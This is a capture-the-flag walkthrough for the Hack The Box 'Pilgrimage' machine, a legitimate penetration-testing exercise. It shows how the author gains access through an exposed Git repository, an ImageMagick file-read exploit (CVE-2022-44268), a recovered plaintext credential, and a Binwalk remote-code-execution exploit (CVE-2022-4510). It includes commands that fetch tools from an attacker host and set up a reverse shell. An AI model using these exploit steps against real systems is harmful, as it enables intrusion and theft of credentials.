# About
Pilgrimage is an easy-difficulty Linux machine featuring a web application with an exposed `Git` repository. Analysing the underlying filesystem and source code reveals the use of a vulnerable version of `ImageMagick`, which can be used to read arbitrary files on the target by embedding a malicious `tEXT` chunk into a PNG image. The vulnerability is leveraged to obtain a `SQLite` database file containing a plaintext password that can be used to SSH into the machine. Enumeration of the running processes reveals a `Bash` script executed by `root` that calls a vulnerable version of the `Binwalk` binary. By creating another malicious PNG, `CVE-2022-4510` is leveraged to obtain Remote Code Execution (RCE) as `root`. 

# Enumeration

```
nmap -A -T4 -p- 10.129.64.204
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.129.64.204:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
|_http-title: Pilgrimage - Shrink Your Images
```

Update Hosts File
```
10.129.64.204	pilgrimage.htb
```



# Web Enumeration

Since in our original enumeration scans we found a .git directory I am going to start with gitdumper.

Git-Dumper `git-dumper http://pilgrimage.htb/.git/ git_loot`

![](Images/Pasted%20image%2020250502140904.png)

Use extractor to get all of the commits `./extractor.sh git_loot git_extract`

![](Images/Pasted%20image%2020250502140939.png)

Some users found in the commit text
```
author emily <emily@pilgrimage.htb> 1686132708 +1000
committer root <root@pilgrimage.htb> 1686132708 +1000
```

There is a file called Magick within the root directory

![](Images/Pasted%20image%2020250502141855.png)

We can identify the version of ImageMagick `./magick --version`

![](Images/Pasted%20image%2020250502142431.png)


# Exploit


This version is vulnerable to CVE-2022-44268 Arbitrary File Read [POC](https://github.com/kljunowsky/CVE-2022-44268). Lets test the POC with a basic file to read being /etc/hosts

```
python3 exploit.py --image image.jpeg --file-to-read /etc/hosts --output poisoned.jpeg
```

![](Images/Pasted%20image%2020250502143113.png)

We can remotely read files from the target host now. We will have to find where the sensitive data is stored before moving forward. Taking a look back at the source. Within `login.php` we find the following source code

![](Images/Pasted%20image%2020250502143353.png)

So we know the path `/var/db/pilgrimage` now lets read that data using the POC. That threw an error.

![](Images/Pasted%20image%2020250502143659.png)

So instead we will download the file and see what we can do with it. If we take the hex from the file and convert it using [CyberChef](https://gchq.github.io/CyberChef/) we get the following decoded text. `emily:abigchonkyboi123`

![](Images/Pasted%20image%2020250502145003.png)

We can then use those credentials to login via SSH.

![](Images/Pasted%20image%2020250502145059.png)

![](Images/Pasted%20image%2020250502145121.png)

# Post-Exploitation

Copy Linpeas over and run
```
wget http://10.10.14.251:8888/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

We have what appears to be a custom tool being run by the root user. `malwarescan.sh`

![](Images/Pasted%20image%2020250502145933.png)

```
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
 filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
 binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
  if [[ "$binout" == *"$banned"* ]]; then
   /usr/bin/rm "$filename"
   break
  fi
 done
done
```

In this script, the directory `/var/www/pilgrimage.htb/shrunk/` is being monitored by `inotifywait` and passes files to binwalk. The binwalk version on this host is `Binwalk v2.3.2` lets lookup if there's anything on it.

We find [CVE-2022-4510](https://www.exploit-db.com/exploits/51249)which allows us to get RCE via this Binwalk version

```
python3 51249.py image.jpeg 10.10.14.251 4444

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################

You can now rename and share binwalk_exploit and start your local netcat listener.
```

Start our netcat listener and upload the file. Uploading it via the web directory did not work. So lets transfer it over and move it to the directory listed in the `malwarescan.sh` file.

![](Images/Pasted%20image%2020250502150907.png)

![](Images/Pasted%20image%2020250502150941.png)





